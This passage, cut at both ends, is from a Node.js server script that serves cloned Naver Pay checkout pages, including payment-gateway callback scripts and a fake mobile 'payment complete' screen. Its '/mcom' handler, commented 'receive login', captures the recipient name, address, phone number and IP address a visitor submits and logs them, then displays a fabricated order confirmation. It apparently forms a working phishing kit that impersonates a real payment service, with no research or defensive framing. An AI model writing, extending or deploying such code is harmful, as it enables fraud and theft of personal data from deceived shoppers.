							pgid = bill.getOneClickCardPg(cardcd, orgPgid, 'pgid');
						}
						var newValue = bill.convertPg(pgid, cardcd, instmo, pgid, 'pgid', amt);
						if (newValue.toString() == pgid.toString()) {
							return false;
						} else {
							return true;
						}
					}
					
					
					bill.postForm = function (path, params, method, type, frame) {
						method = method || "post";
						var form = document.createElement("form");
						form.setAttribute("method", method);
						form.setAttribute("action", path);
						for(var key in params) {
							var hiddenField = document.createElement("input");
							hiddenField.setAttribute("type", "hidden");
							hiddenField.setAttribute("name", key);
							hiddenField.setAttribute("value", params[key]);
							form.appendChild(hiddenField);
						}
						document.body.appendChild(form);
						if (type == 'P') {
							window.open('', 'ocformpopup', 'width=500,height=680,resizeable,scrollbars,location=no,status=no');
							form.target = 'ocformpopup';
						} else if (type == 'I') {
							form.target = frame;
							adjustIframeScreen('ct', frame);
							$Element(frame).show();
						}
						form.submit();
					}
					function adjustIframeScreen(main, iframe){
						 var width = (window.innerWidth > 0) ? window.innerWidth : screen.width;
						 var height = (window.innerHeight > 0) ? window.innerHeight : screen.height;
						 if(typeof document.getElementById(main) != 'undefined' && document.getElementById(main) != null){
							 $Element(main).hide();
						 }
						 $Element(iframe).css({width: width+"px", height: height+"px"});
					}
					
					bill.getForm = function (path, type, frame) {
						method = "get";	
						var form = document.createElement("form");
						form.setAttribute("method", method);
						if (type == 'P') {
							
							if(navigator.userAgent.match(/Trident\/5.0/i) != null || navigator.userAgent.match(/Trident\/6.0/i) != null || navigator.userAgent.match(/Trident\/7.0/i) != null){
								   var ocWindow = window.open('', 'ocformpopup', 'width=500,height=680,resizeable,scrollbars,location=no,status=no');
									ocWindow.location.href=path;
							}else{
								var referLink = document.createElement('a');
								referLink.href = path;
								referLink.target="ocformpopup";
								referLink.onclick=function(){window.open(path, 'ocformpopup', 'width=500, height=680, resizeable=yes, scrollbars=yes')};
								document.body.appendChild(referLink);
								referLink.click();
							}
					
							
						} else if (type == 'I') {
							form.action = path;
							form.target = frame;
							$Element(frame).show();
							form.submit();
						}
						
					}
					
					bill.getMemberUrl = function () {
						if (bill.variable._device == 'MOBILE') {
							return "http://nid.naver.com/mobile/naverPay.nhn";
						} else {
							return "http://nid.naver.com/user2/naverPay.nhn";
						}
					}
					
					function doPay_Result(X_RESP,X_MSG,VBV_XID,VBV_ECI,VBV_CAVV,VBV_JOINCODE,LGD_PAN,LGD_EXPYEAR,LGD_EXPMON, LGD_SP_AUTHTYPE)
					{
						bill.variable._returnForm.value("VBV_XID", VBV_XID);
						bill.variable._returnForm.value("VBV_ECI", VBV_ECI);
						bill.variable._returnForm.value("VBV_CAVV", VBV_CAVV);
						bill.variable._returnForm.value("LGD_PAN", LGD_PAN);
						bill.variable._returnForm.value("LGD_EXPYEAR", LGD_EXPYEAR);
						bill.variable._returnForm.value("LGD_EXPMON", LGD_EXPMON);
						bill.variable._returnForm.value("LGD_SP_AUTHTYPE", LGD_SP_AUTHTYPE);
						
						if(VBV_JOINCODE != null)
						{
							bill.variable._returnForm.value("VBV_JOINCODE", VBV_JOINCODE);
						}
						bill.variable._lastCallbackFn("success");	
					}
					
					function doPay_Result_ISP(X_RESP,X_MSG,KVP_NOINT,KVP_QUOTA,KVP_CARDCODE,KVP_SESSIONKEY,KVP_ENCDATA, LGD_SP_AUTHTYPE)
					{
						bill.variable._returnForm.value("KVP_NOINT", KVP_NOINT);
						bill.variable._returnForm.value("KVP_QUOTA", KVP_QUOTA);
						bill.variable._returnForm.value("KVP_CARDCODE", KVP_CARDCODE);
						bill.variable._returnForm.value("KVP_SESSIONKEY", KVP_SESSIONKEY);
						bill.variable._returnForm.value("KVP_ENCDATA", KVP_ENCDATA);
						bill.variable._returnForm.value("LGD_SP_AUTHTYPE", LGD_SP_AUTHTYPE);
						bill.variable._lastCallbackFn("success");
					}
					
					function doPay_Resultfail(X_RESP,X_MSG)
					{
					// 실패처리 
						alert(X_MSG+"["+X_RESP+"]");
						bill.variable._lastCallbackFn("fail");
					}
					
					function doPay_mobile_Result(X_RESP,X_MSG,authType,phoneId,Mobilid,ansimFlag,safeGuard,mUserkey,carrier)
					{
						if (bill.variable._returnForm.value("PGCP") == "05B") {
							bill.variable._returnForm.value("data", "");
							bill.variable._returnForm.value("CORPCD", carrier);
						}
						if (bill.variable._returnForm.value("PGCP") == "05A" || bill.variable._returnForm.value("PGCP") == "60A") {
							bill.variable._returnForm.value('Okurl', '');
							bill.variable._returnForm.value('Cryptstring', '');
							bill.variable._returnForm.value('Failurl', '');
							bill.variable._returnForm.value('Prdtprice', '');
							bill.variable._returnForm.value('SocialNo', '');
							bill.variable._returnForm.value("CORPCD", carrier);
						}
						
						if (bill.variable._returnForm.value("PGCP") == "60A" && bill.variable._returnForm.value('MC_JOIN_TYPE') == "A") {
							bill.variable._lastCallbackFn("success");
							return false;
						}
						
						bill.variable._returnForm.value("authType", authType);
						if ((typeof phoneId != "undefined") && phoneId != "") {
							bill.variable._returnForm.value("phoneId", phoneId);
						}
						bill.variable._returnForm.value("Mobilid", Mobilid);
						bill.variable._returnForm.value("ansimFlag", ansimFlag);
						bill.variable._returnForm.value("safeguard", safeGuard);
						bill.variable._returnForm.value("mUserKey", mUserkey);
						bill.variable._lastCallbackFn("success");
					}
					
					function doPay_mobile_Resultfail(X_RESP,X_MSG)
					{
						if (bill.variable._returnForm.value("PGCP") == "05B") {
							bill.variable._returnForm.value("data", "");
						}
						if (bill.variable._returnForm.value("PGCP") == "05A" || bill.variable._returnForm.value("PGCP") == "60A") {
							bill.variable._returnForm.value('Okurl', '');
							bill.variable._returnForm.value('Cryptstring', '');
							bill.variable._returnForm.value('Failurl', '');
							bill.variable._returnForm.value('Prdtprice', '');
							bill.variable._returnForm.value('SocialNo', '');
						}
						bill.variable._returnForm.value("MSG", X_MSG);
						bill.variable._lastCallbackFn("mobilepreapprovalerror");
					}
					
					function doPay_Oneclick_Credit_Result(resultCode, resultMessage, virSeq)
					{
						if (bill.variable._returnForm.value("OC_REGTYPE") == 'I') {
							$Element(bill.variable._returnForm.value("OC_REGFRAME")).hide();
						}
						if ((typeof virSeq != "undefined") && virSeq != "") {
							bill.variable._returnForm.value('AUTHNO', virSeq);
							bill.variable._returnCommonForm.value('AUTHNO', virSeq);
						}
						bill.variable._returnForm.value("MSG", resultMessage);
						bill.variable._lastCallbackFn("success");
					}
					
					function doPay_Oneclick_Credit_ResultFail(resultCode, resultMessage, virSeq)
					{	
						if (bill.variable._returnForm.value("OC_REGTYPE") == 'I') {
							$Element(bill.variable._returnForm.value("OC_REGFRAME")).hide();
						}
						bill.variable._returnForm.value("MSG", resultMessage);
						bill.variable._lastCallbackFn("oneclickcreditregerror");
					}
					
					function doPay_Oneclick_Bank_Result()
					{
						
						//bill.variable._returnForm.value('AUTHNO', virSeq);
						//bill.variable._returnCommonForm.value('AUTHNO', virSeq);
						bill.variable._returnForm.value("MSG", 'success');
						bill.variable._lastCallbackFn("success");
					}
					
					function doPay_Oneclick_Bank_ResultFail()
					{	
						
						bill.variable._returnForm.value("MSG", 'fail');
						bill.variable._lastCallbackFn("oneclickcreditregerror");
					}
					
					function doPay_Bank_Result(resultCode, resultMessage, payKey, authUrl, netCancelUrl, orderNumber, checkAckUrl) {
						var pgCp = bill.variable._returnForm.value("PGCP"); 
						if (pgCp == "04F") {
							bill.variable._returnForm.value('LGD_PAYKEY', payKey);
						}else if(pgCp == "04E") {
							INIStdPay.$modalDiv.modal('hide');
							bill.variable._returnForm.value("MSG", resultMessage);
							bill.variable._returnForm.value('authToken', payKey);
							bill.variable._returnForm.value('authUrl', authUrl);
							bill.variable._returnForm.value('netCancelUrl', netCancelUrl);
							bill.variable._returnForm.value('orderNumber', orderNumber);
							bill.variable._returnForm.value('checkAckUrl', checkAckUrl);
						}
						bill.variable._lastCallbackFn("success");
					}
					
					function doPay_Bank_ResultFail(resultCode, resultMessage) {
						bill.variable._returnForm.value("MSG", resultMessage);
						if(resultMessage != '' ){
							bill.variable._lastCallbackFn("failmsg");	
						}
						var pgCp = bill.variable._returnForm.value("PGCP");
						if (pgCp == "04E") {
							INIStdPay.viewOff();
						}
						
					}
					
					function doPay_Credit_ResultFail(resultCode, resultMessage) {
						bill.variable._returnForm.value("MSG", resultMessage);
						bill.variable._lastCallbackFn("fail");
						INIStdPay.viewOff();
					}
					
					function doPay_Credit_Result(resultCode, resultMessage, authToken, authUrl, netCancelUrl, orderNumber, checkAckUrl) {
						bill.variable._returnForm.value("MSG", resultMessage);
						bill.variable._returnForm.value('authToken', authToken);
						bill.variable._returnForm.value('authUrl', authUrl);
						bill.variable._returnForm.value('netCancelUrl', netCancelUrl);
						bill.variable._returnForm.value('orderNumber', orderNumber);
						bill.variable._returnForm.value('checkAckUrl', checkAckUrl);
						bill.variable._lastCallbackFn("success");
						
						
					}
					
					</script>
					<!--  수정 불가(IFRAME 방식시 사용)   -->
					<div id="LGD_PAYMENTWINDOW" style="position:absolute; display:none; left:0; top:0; width:100%; height:100%; background-color:white; z-index:100 ; font-size:small; ">
						 <iframe id="LGD_PAYMENTWINDOW_IFRAME" name="LGD_PAYMENTWINDOW_IFRAME" height="100%" width="100%" scrolling="auto" frameborder="0" style="background-color:white;" title="내용없음">
						 </iframe>
					</div>
					<div id="INI_PAYMENTWINDOW" style="position:absolute; display:none; left:0; top:0; width:100%; height:100%; background-color:white; z-index:100 ; font-size:small; ">
						 <iframe id="INI_PAYMENTWINDOW_IFRAME" name="INI_PAYMENTWINDOW_IFRAME" height="100%" width="100%" scrolling="no" frameborder="0" style="background-color:white;" title="내용없음">
						 </iframe>
					</div>
					<script type="text/javascript" language="JavaScript" src="http://ssl.pstatic.net/static.checkout/layout/202202231455/js/customer/layout.variable.real.js"></script>
					<script type="text/javascript" language="JavaScript" src="http://ssl.pstatic.net/static.checkout/layout/202202231455/js/customer/layout.gnb.js"></script>
					<script type="text/javascript" language="JavaScript" src="http://ssl.pstatic.net/static.checkout/layout/202202231455/js/customer/layout.lnb.js"></script>
					<script type="text/javascript" language="JavaScript" src="http://ssl.pstatic.net/static.checkout/layout/202202231455/js/customer/checkout.nclktag.js"></script>
					
					</body></html>`
					res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
					res.end(com);  
						
				
				}); 

			}




			
			if(req.method =='POST' && req.url == '/mcom') { // receive login
				req.on('data', function(chunk) { 
					
					//console.log(chunk.toString()); 
					var data = qs.parse(chunk.toString());
					if(!(data.receiverName == undefined)){
					console.log("\n\n-------------------------------\n\n주문이 입력되었습니다 \n\n수령 이름 : "+data.receiverName+"\n\n수령주소 : "+data.baseadd +" "+ data.inadd+"\n\n수령자 전화번호: "+data.phonenumber1+"-"+data.phonenumber2+"-"+data.phonenumber3+"\n\n-------------------------------\n\n" )
					console.log('[ 정보 ] 모바일 결제완료 창 접속\n\nIP : '+requestIp.getClientIp(req))
					}

						
						mcom = `<html data-useragent="Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Mobile Safari/537.36 Edg/99.0.1150.39"><head><style type="text/css" id="_jmc_no_tap_highlight_tag_"></style>
						<link type="text/css" rel="stylesheet" href="http://img.pay.naver.net/o/mstatic/css/service/mobile/component.css?1646915268194">
						<link type="text/css" rel="stylesheet" href="http://img.pay.naver.net/o/mstatic/css/service/mobile/layout.css?1646915268194">
						<link type="text/css" rel="stylesheet" href="http://img.pay.naver.net/o/mstatic/css/service/mobile/ordersheet.css?1646915268194">
						</head><body><form id="orderForm" action="/com" name="orderForm" class="_orderForm" method="post">
						<meta charset="utf-8">
						<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
						<meta name="format-detection" content="telephone=no">
						<meta name="referrer" contents="always">
						<meta property="og:title" content="네이버페이">
						<meta property="og:image" content="https://img.pay.naver.net/static/images/customer/og/naverpay.png">
						<meta property="og:description" content="네이버 ID로 간편구매, 네이버페이">
						<!-- 기기 분기처리 스크립트 -->
						
						<title>네이버페이</title>
						<link rel="shortcut icon" type="image/x-icon" href="https://ssl.pstatic.net/static.checkout/layout/202202231455/images/mobile/icon/android_legacy_xxxhpdi_192x192.png">
						<link rel="apple-touch-icon-precomposed" href="https://ssl.pstatic.net/static.checkout/layout/202202231455/images/mobile/icon/android_legacy_xxxhpdi_192x192.png">
						<link type="text/css" rel="stylesheet" href="https://ssl.pstatic.net/static.checkout/layout/202202231455/css/mobile/layout.css">
						
						
						
							<div class="_body" style="display: block;">
								<div id="header">
									<div class="gnb">
										<a href="http://m.pay.naver.com/mobile/home" class="N=a:ode.paylogo absolutev logo_npay">
											<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="60" height="23" viewBox="0 0 60 23">
												<defs>
													<path id="prefix__a" d="M0 23L60 23 60 0 0 0z"></path>
												</defs>
												<g fill="none" fill-rule="evenodd">
													<path fill="#03C75A" d="M30.688 6.563v4.2h2.4c1.587 0 2.551-.495 2.551-2.036v-.33c0-1.45-.964-1.834-2.343-1.834h-2.608zM28.27 4.6h5.14c3.27 0 4.668 1.614 4.668 3.778v.386c0 2.146-1.512 3.98-4.668 3.98h-2.72v5.081h-2.42V4.6zM45.528 13.137h-2.32c-1.243 0-1.677.517-1.677 1.34v.23c0 .688.49 1.09 1.414 1.09 1 0 1.66-.21 2.15-.708.433-.421.433-.88.433-1.665v-.287zm-6.297 1.741v-.612c0-1.722.999-3.004 3.921-3.004h2.376v-.401c0-1.302-.566-1.837-1.848-1.837-1.112 0-2.074.363-2.94 1.052l-1.17-1.76C40.626 7.57 41.927 6.9 43.7 6.9c2.431 0 4.185 1.244 4.185 3.367v7.405h-2.131l-.038-1.301c-.395.937-1.866 1.454-2.96 1.454-2.224 0-3.525-1.09-3.525-2.947zM52.211 6.9L54.529 14.401 54.603 14.401 56.939 6.9 59.423 6.9 54.121 21.275 51.933 20.519 53.249 17.184 49.615 6.9z"></path>
													<mask id="prefix__b" fill="#fff">
														<use xlink:href="#prefix__a"></use>
													</mask>
													<path fill="#03C75A" d="M0 23L23.077 23 23.077 0 0 0z" mask="url(#prefix__b)"></path>
													<path fill="#FFF" d="M16.731 17.25L13.362 17.25 9.298 11.095 9.298 17.25 5.769 17.25 5.769 5.75 9.138 5.75 13.202 11.905 13.202 5.75 16.731 5.75z" mask="url(#prefix__b)"></path>
												</g>
											</svg>
											<span class="blind">네이버페이</span>
										</a>
										<h1 class="pageh1">결제완료</h1>
											<button type="button" class="N=a:ode.close absolutev absoluter" onclick="location.href='http://m.pay.naver.com/mobile/home'">
												<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30">
													<g fill-rule="evenodd">
														<path d="M17.301 0L0 17.301 0.7 18 18 0.699z" transform="translate(6 6)"></path>
														<path d="M0.699 0L0 0.699 17.3 18 18 17.301z" transform="translate(6 6)"></path>
													</g>
												</svg><span class="blind">화면닫기</span>
											</button>
									</div>
								</div>
								<hr>
								<div id="ct" role="main">
						
						
						
						
						<!-- pg사별 Script -->
							
							
							
							
							
							
						<!-- 결제관련 공통 Script -->
						
						
							
							
							
							
							
							
						
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																														   
						 <!-- ISP, 현대, NH, 하나, 외환 -->
						
						
						
						
						
						
						
						
						
						
							<input type="hidden" name="donAgree" value="false" class="_donAgree _certificationForm">
							<input type="hidden" name="tempOrderId">
							<input type="hidden" name="prestigeKey" value="" class="_certificationForm">
						
							<input type="hidden" name="fdsUuid" value="" id="fdsUuid" class="_fdsUuid _certificationForm">
							<input type="hidden" name="naverToken" value="" class="_naverToken _certificationForm">
							<input type="hidden" name="isNaverPayPasswordAvailable" value="false" class="_certificationForm">
							<input type="hidden" name="authentificationToken" value="" class="_authentificationToken _certificationForm">
							<input type="hidden" name="mbrsSscYn" value="false" class="_certificationForm">
						
							<div class="ord_cont _productDetail _productInfos _coupon_area">
						
						
						
						
								
							
							
								<input type="hidden" class="opt _sellerNames" value="위드잇">
								<input type="hidden" class="opt _overseasDeliverySellerNames" value="">
							
							
						
						
								
						<div>
							<!-- 네이버페이 포인트(포인트) -->
							
						
						
						
							
						<!-- 결제정보 -->
						
						
						<div class="order_box receipt_sc _cashReceiptTemplate" style="display: none;">
							<input type="hidden" id="receiptServiceType" name="receiptInfo.serviceType" value="" disabled="">
							<div class="ord_tit_v2 receipt _cashreceipt">
								<table cellpadding="0" cellspacing="0" border="0" class="tbl_ord">
								<colgroup><col width="100"><col>
								</colgroup><tbody><tr>
								<th scope="row">
									<div class="tlb_tit ic_terms5">
										<strong>현금영수증</strong><a href="#" class="ico_q _click(checkout.mobile.order.order_sheet.showCashReceiptInfoLayer()) _stopDefault">현금영수증 발급안내 도움말</a>
										<span>필수입력</span>
									</div>
								</th>
								<td>
									<ul class="rh_lst">
									<li class="on">
										<input type="radio" name="receiptInfo.receiptApplyed" value="true" id="rdo3_r1" class="N=a:ode.rece chk_rd _click(checkout.mobile.order.order_sheet.isCashReceipt()) _payForm" checked="checked" disabled="">
										<label for="rdo3_r1">신청</label>
									</li>
									<li class="">
										<input type="radio" name="receiptInfo.receiptApplyed" value="false" id="rdo3_r2" class="N=a:ode.norec chk_rd _click(checkout.mobile.order.order_sheet.isCashReceipt()) _payForm" disabled="">
										<label for="rdo3_r2">미신청</label>
									</li></ul>
								</td>
								</tr>
								</tbody></table>
							</div>
							<span class="_cashReceiptInfo" style="display: inline;">
								<div class="ord_inr receipt _cashReceiptInfoInput">
									
								</div>
							</span>
						</div>
						
						<div>
						<input type="checkbox" id="payment_detail" class="N=a:ode.sum hidden" checked="">
						<div class="benefit_point price_detail _paymentAmountInfoArea">
							<label for="payment_detail" class="fold_h h_arrow">
								<h4 class="point_h">결제상세
									<span class="point"><span class="_totalPaymentAmount">`+String(가격1 + 2500)+`</span>원</span>
								</h4>
							</label>
							<div class="point_content">
								<ul class="s_benefit_list">
									<li class="s_benefit_item">
										<div class="benefit_summary">
											<strong>주문금액</strong>
											<span class="summary_num"><em class="_totalPaymentAmount">`+String(가격1 + 2500)+`</em>원</span>
										</div>
										<ul class="inner_list">
											<li>
												<div class="benefit_case">상품금액</div>
												<span class="benefit_sum"><em>`+String(기존가격1)+`</em>원</span>
											</li>
												<li>
													<div class="benefit_case">배송비</div>
													<span class="benefit_sum"><dummy class="_totalDeliveryFeeSign">+</dummy><em class="_totalDeliveryFee">2500</em>원</span>
												</li>
												<li>
													<div class="benefit_case">쿠폰할인</div>
													<span class="benefit_sum"><dummy class="_totalDiscountPriceSign">-</dummy><em class="_totalDiscountPrice">`+String(기존가격1-가격1)+`</em>원</span>
												</li>
										</ul>
									</li>
								</ul>
								<ul class="payment_detail_list">
										<li class="_mileageUsedPaymentAmountArea" style="display: none;">
											<div class="benefit_summary">
												<strong>포인트 사용</strong>
												<span class="summary_num"><em class="_mileageUsedAmount">0</em>원</span>
											</div>
										</li>
									<li class="_payLaterAmountArea" style="display: none">
										<div class="benefit_summary">
											<strong>후불결제</strong>
											<span class="summary_num"><em class="_payLaterAmount">0</em>원</span>
										</div>
									</li>
									<li class="_generalPaymentAmountArea payment_item" style="display: list-item;">
										<div class="benefit_summary">
											<strong class="_generalPaymentClass">카드 간편결제</strong>
											<span class="summary_num"><em class="_generalPaymentAmount">`+String(가격1 + 2500)+`</em>원</span>
										</div>
									</li>
									<input type="hidden" class="_lastTotalPaymentPrice" name="order.payments[0].generalPayAmt" value="11200">
								</ul>
							</div>
						</div>
						</div> 
						
						<div class="_benefitAreaDisplayStatus on" style="display: block;">
							<input type="checkbox" id="benefit1_1" class="hidden" checked="">
							
						</div>
						
						<div class="ord_sc terms_sc">
							<div class="terms_inr _allAgreementsArea">
						
								<li class="_agreeBox _payAgreement" style="display: none"><span><input type="checkbox" id="agree5" class="check_circle _certificationForm" name="payAgreement" checked=""><label for="agree5">위 구매조건 확인 및 결제진행 동의</label></span></li>
									<h3 class="term_name" style="display: none"><span class="term_text on"><input type="checkbox" id="all_agree_btn" class="check_circle _allAgreeBtn" name="allAgree"><label for="all_agree_btn">전체 동의하기</label></span></h3>
									<div class="chk_area tit_area">
									</div>
						
								<div class="area_info">
										<p class="comment">
												<span class="tit">개인정보 제공 동의 : </span>
												위드잇
						
											  
													<button type="button" class="button_detail _click(checkout.mobile.order.order_sheet.showAgreeDetailLayer(C2AgreementDetail))">상세보기</button>
										</p>
						
									<div class="purchase_safely">
										<p>구매안전 서비스 안내<button type="button" class="sp_ordersheet_icon icon_help_14 _click(checkout.mobile.order.order_sheet.showSafePurchaseHelp()) _stopDefault"><span class="blind">도움말</span></button></p>
										<div class="tooltip_box _safePurchaseHelp">
											<dl class="lay_content">
												<dt>구매안전 서비스 안내</dt>
												<dd>
													<ul class="list_info">
														<li>네이버파이낸셜(주)의 네이버페이 주문서를 통해 거래하는 모든 판매자는 안전거래를 위해 현금성 결제수단(계좌간편결제, 네이버페이 포인트 등)으로 결제한 거래에 대하여 자동적으로 네이버파이낸셜(주)이 제공하는 구매안전서비스(결제대금예치)를 적용하고 있습니다.</li>
														<li>네이버파이낸셜(주)의 전자금융거래법에 따라 금융위원회에 전자금융업자로 등록하였으며 결제대금예치업 등록번호는 02-006-00056 입니다.</li>
														<li>등록여부는 금융감독원 홈페이지(www.fss.or.kr)의 인허가업무안내 &gt; 등록신고 &gt; 전자금융업등록현황에서 확인하실 수 있습니다.</li>
													</ul>
												</dd>
											</dl>
											<a href="#" class="btn_close_layer _click(checkout.mobile.order.order_sheet.closeSafePurchaseHelp()) _stopDefault" role="button"><span class="blind">도움창 닫기</span></a>
										</div>
									</div>
								</div>
							</div>
							<div class="chk_area tit_area _pinPayAgree on" style="display:none;">
								<span class="label_link">
									<input type="checkbox" id="simple_hp" name="isPinPayAgree" class="check_circle">
									<label for="simple_hp" class="required"><a href="#" class="label_link _click(checkout.mobile.order.order_sheet.openPinPaymentProvideInfo()) _stopDefault">휴대폰 간편결제 등록정보 수집 및 동의하기</a></label>
								</span>
							</div>
						</div>
						<div class="area_notice">
							<p class="notice">결제가 완료되었습니다</p>
						</div>
						
						
						
						
						<div class="button_section _confirmBtnDiv" style="display:none;">
							<div class="button_area">
								<a href="#" class="btm_button _click(checkout.mobile.order.order_sheet.pinManage.agreePinPay()) _stopDefault">확인</a>
								<a href="#" class="btm_button _click(checkout.mobile.order.order_sheet.showFirstPayMethod()) _stopDefault">취소</a>
							</div>
						</div>
						
						<!-- //배너영역 -->
							<div class="ad_h72_type" id="div-1"></div>
						
						<div class="dimlayer _chargePointInputLayer" style="display:none;">
							<div class="dimbg"></div>
							<div class="top_floating pointcharge_layer">
								<strong class="popup_title">충전</strong>
								<div class="box_input_pointcharge_layer">
									<div class="area_input_pointcharge_layer">
										<input type="tel" name="chargePointInput" placeholder="금액을 입력해주세요." class="input_pointcharge_layer _chargePointInput _onlyPriceTarget _blur(checkout.mobile.order.order_sheet.focusOutChargePointInputPrice()) _focus(checkout.mobile.order.order_sheet.beforeChargePointInputPrice()) _stopDefault">
										<button type="button" class="input_value_clear _clearChargePointInput _click(checkout.mobile.order.order_sheet.clearChargePointInput()) _stopDefault"><span class="blind">초기화</span></button>
									</div>
									<span class="charge_input_unit">원</span>
								</div>
								<ul class="amount_list">
									<li class="amount">
										<button type="button" class="option _click(checkout.mobile.order.order_sheet.addChargePoint(10000)) _stopDefault">+1만</button>
									</li>
									<li class="amount">
										<button type="button" class="option _click(checkout.mobile.order.order_sheet.addChargePoint(100000)) _stopDefault">+10만</button>
									</li>
									<li class="amount">
										<button type="button" class="option _click(checkout.mobile.order.order_sheet.addChargePoint(500000)) _stopDefault">+50만</button>
									</li>
									<li class="amount">
										<button type="button" class="option _click(checkout.mobile.order.order_sheet.addChargePoint()) _stopDefault">+최대</button>
									</li>
								</ul>
						
								<p class="pointcharge_layer_desc _pointcharge_layer_desc">1만원 단위 / <strong class="emph">내 충전한도 450,000원</strong></p>
								<button type="button" class="button_complete _chargePointInputConfirm _click(checkout.mobile.order.order_sheet.confirmChargePointInputPrice()) _stopDefault">확인</button>
								<button type="button" class="button_close openbanking_img _click(checkout.mobile.order.order_sheet.hideModalLayer(chargePointInputLayer)) _stopDefault"><span class="blind">레이어닫기</span></button>
							</div>
						</div>    </div>
						
						
						<div class="_layer_common ly_type2" style="display:none;z-index: 100">
							<div class="lay_content _content">
							</div>
							<a href="#" class="clse _click(nmp.layer.hide()) _stopDefault clse _clse_tab"><span class="blind">닫기</span></a>
						</div>
						
						<div class="_layer_common_edged ly_type" style="display:none;z-index: 100">
							<div class="lay_content _content">
							</div>
							<a href="#" class="clse _click(nmp.layer.hide()) _stopDefault clse _clse_tab"><span class="blind">닫기</span></a>
							<div class="edge_cen"></div>
						</div>
						
						<div class="_layer_common_edged_line ly_type" style="display:none;z-index: 100">
							<div class="lay_content _content">
							</div>
							<a href="#" class="clse _click(nmp.layer.hide()) _stopDefault clse _clse_tab"><span class="blind">닫기</span></a>
							<div class="edge_cen"></div>
							<div class="line"></div>
						</div>
						
						<div class="_layer_common_line ly_type" style="display:none;z-index: 100">
							<div class="lay_content _content">
							</div>
							<a href="#" class="clse _click(nmp.layer.hide()) _stopDefault clse _clse_tab"><span class="blind">닫기</span></a>
							<div class="line"></div>
						</div>
						
						
						
						
						<div class="dimmed _layer_dimmed" style="display:none;"></div>
						
						<div class="ly_bx _layer_easypay_mileage" style="top:20px;display:none;">
							<dl class="benefit_wrap">
								<dt>구매 적립 혜택</dt>
								<dd>
									<ul class="txt layer_benefit_list">
										<li class="layer_benefit_item">상품별 주문금액기준 구매확정 시 즉시 적립됩니다.</li>
										<li class="layer_benefit_item">쿠폰할인금액/배송비/추가구성상품가격/SSG새벽배송 알비백 보증금은 제외되며 1회 주문 기준 최대 10만원까지만 적립됩니다. (단, 무통장입금은 최대 2만원까지 적립)</li>
										<li class="layer_benefit_item">충전포인트/네이버통장 결제적립은 충전포인트 사용금액에서 SSG새벽배송 알비백 보증금을 차감한 금액 기준으로 적립됩니다. (복합결제 시, 간편/일반결제&gt;후불결제&gt;충전포인트 순서로 보증금 금액 차감하여 계산)</li>
										<li class="layer_benefit_item">간편결제/일반결제에 따라 지급되는 적립혜택이 상이할 수 있습니다.</li>
										<li class="layer_benefit_item">상품주문결제 금액에서 구매 적립과 리뷰 적립 포인트를 차감한 금액이 0원 미만 (마이너스 금액)일 경우 구매 적립과 리뷰 작성에 대한 포인트 적립이 제외됩니다.</li>
										<li class="layer_benefit_item">예약/주문 시 노출되는 적립 금액은 적립 예상 금액으로 프로모션 내용에 따라 실제 적립되는 금액과 차이가 있을 수 있습니다.<br>(프로모션 상세 조건에 따라 적립)</li>
										<li class="layer_benefit_item">예약은 이용완료 후 적립됩니다.</li>
										<li class="layer_benefit_item">네이버주문은 음식 서빙 및 픽업이 완료된 이후 적립됩니다.</li>
										<li class="layer_benefit_item"><b>원쁠딜 공유 추가적립은 동일 상품에 대해 1회로 제한됩니다.</b></li>
										<li><a href="https://m.help.naver.com/support/contents/contentsView.help?contentsNo=7175" class="btn_txt">적립정책 자세히보기</a></li>
									</ul>
									<ul class="benefit_lst benefit_lst_v2 _content">
									</ul>
								</dd>
							</dl>
							<div class="cls_btn cls_btn_v2">
								<a href="#" class="N=a:ode.closeto _click(checkout.mobile.order.order_sheet.hideLayerEasyPayMileage()) _stopDefault">닫기</a>
							</div>
						</div>
						
						<script type="text/template" class="_tpl_layer_easypay_mileage">
							{for index:item in items}
							<li class="benefit_item">
								<div class="tmb">
									<img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH+A1BTQQAsAAAAAAEAAQAAAgJEAQA7" alt="{=item.productName}" data-src="https://m.pay.naver.com{=item.imageUrl}?type=m120" data-error-src="https://img-shop.pstatic.net/front/common/noimg/no_img_120x120.jpg" width="50" height="50"/>
								</div>
								<div class="inr">
									<strong class="tit">{=item.productName}</strong>
									{set commaMileage=pug.utility.convertNumberFormat(=item.mileage)}
									<span class="detail"><strong>{=commaMileage}</strong>원</span>
								</div>
							</li>
							{/for}
						</script>
						
						<div class="ly_bx _layer_card_benefit" style="display:none;">
							<div class="_content ly_cont no_payment _cardBenefitContents">
							</div>
						</div>
						
						<script type="text/template" class="_tpl_layer_card_mileage">
							<strong class="no_payment_title">혜택카드 적립</strong>
							<ul class="list_dot">
								<li class="item_dot">· 동일주문 내 모든 상품의 상태가 종료되면 구매확정 상품에 한해, 혜택카드 결제금액에 대한 혜택이 잔여한도 내에서 적립됩니다.</li>
								<li class="item_dot">· 혜택카드 잔여한도는 전체한도에서 확정 및 예정 혜택을 제외한 금액입니다.</li>
								<li class="item_dot">· 혜택 한도 소진 후 기존 주문에 대한 취소/환불 등의 사유로 한도 복구가 되더라도, 한도 소진 상태에서의 주문들에 대해서는 혜택이 소급적용 되지 않습니다.</li>
							</ul>
							<div class="area_reward">
								<div class="image">
									<img src={=cardImageUrl} width="40" height="26" alt={=cardName}>
								</div>
								<strong class="target">{=cardName}</strong>
								<span class="reward">
										<span class="cell">
											<span class="area_ellipsis">
												<span class="ellipsis">이벤트기간 내 잔여한도</span>
											</span>
										</span>
										<span class="cell">
											{set remainedCardBenefit=pug.utility.convertNumberFormat(=remainedCardBenefitAmount)}
											<em class="point">{=remainedCardBenefit}<span class="text">원</span></em>
										</span>
									</span>
							</div>
							<div class="pop_btnarea">
								<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.hideLayerCardBenefit())">확인</button>
							</div>
						</script>
						
						<div class="ly_bx _layer_review_mileage" style="top:20px;display:none;">
							<dl class="benefit_wrap benefit">
								<dt>리뷰 적립 혜택</dt>
								<dd class="_content"></dd>
							</dl>
							<div class="close_btn">
